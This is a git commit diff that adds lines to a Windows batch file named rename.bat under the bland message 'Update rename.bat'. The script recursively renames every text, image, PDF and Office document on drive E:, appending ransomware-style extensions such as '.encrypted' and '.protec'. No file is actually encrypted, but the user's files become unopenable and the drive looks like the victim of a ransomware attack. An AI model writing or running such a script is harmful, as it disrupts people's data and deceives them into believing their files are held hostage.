9e2d7c5c3b4dfa30ebd8f3235838045a095ab826
akashganguly420 <akashganguly420@gmail.com>
2021-12-15 18:01:06 +0530

    Update rename.bat

--- rename.bat
+++ rename.bat
@@ -1,1 +1,21 @@
-forfiles /S /M *.txt /C "cmd /c rename @file @fname.jph"
+e:
+forfiles /S /M *.txt /C "cmd /c rename @file @fname.e"
+forfiles /S /M *.jpg /C "cmd /c rename @file @fname.en"
+forfiles /S /M *.png /C "cmd /c rename @file @fname.enc"
+forfiles /S /M *.jpeg /C "cmd /c rename @file @fname.encr"
+
+forfiles /S /M *.bmp /C "cmd /c rename @file @fname.encry"
+forfiles /S /M *.raw /C "cmd /c rename @file @fname.encryp"
+forfiles /S /M *.psd /C "cmd /c rename @file @fname.encrypt"
+forfiles /S /M *.psd /C "cmd /c rename @file @fname.encrypt"
+forfiles /S /M *.pdf /C "cmd /c rename @file @fname.encrypte"
+forfiles /S /M *.xps /C "cmd /c rename @file @fname.encrypted"
+
+forfiles /S /M *.doc /C "cmd /c rename @file @fname.p"
+forfiles /S /M *.docx /C "cmd /c rename @file @fname.pr"
+forfiles /S /M *.xls /C "cmd /c rename @file @fname.pro"
+forfiles /S /M *.xlsx /C "cmd /c rename @file @fname.prot"
+forfiles /S /M *.ppt /C "cmd /c rename @file @fname.prote"
+forfiles /S /M *.pptx /C "cmd /c rename @file @fname.protec"
+
+
